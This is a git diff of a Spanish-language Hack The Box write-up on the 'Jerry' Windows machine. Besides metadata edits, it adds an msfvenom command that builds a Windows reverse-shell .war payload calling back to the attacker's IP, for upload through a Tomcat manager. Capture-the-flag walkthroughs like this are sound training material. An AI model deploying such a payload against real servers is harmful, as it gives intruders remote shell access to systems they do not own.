@@ -1,9 +1,10 @@
 ---
 title: Jerry - HTB Writeup
-author: M4teoo
-date: 2023-09-06 14:00:00
+date: 2023-09-06 22:00:00
 categories: [Writeups, HTB]
 tags: [Easy, Windows]
+image:
+    path: /assets/img/post/jerry/catherine-heath-i4W8OINLI_I-unsplash.jpg
 ---
 
 **Jerry** es una máquina de dificultad ```Easy``` en la plataforma **Hack The Box**
@@ -39,6 +40,10 @@ Vemos que hay una sección donde podemos **subir archivos** ```.war``` , la cual
 ## Explotación
 
 Usaremos la herramienta ```msfvenom``` para crear una ```reverse shell``` en windows y poder acceder mediante ```nc```:
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=443 -f war > rev_shell.war
+```
 
 ![img](/assets/img/post/jerry/6f231e1c-e4ea-4e1c-a7ea-c9341910e71c.png)
 
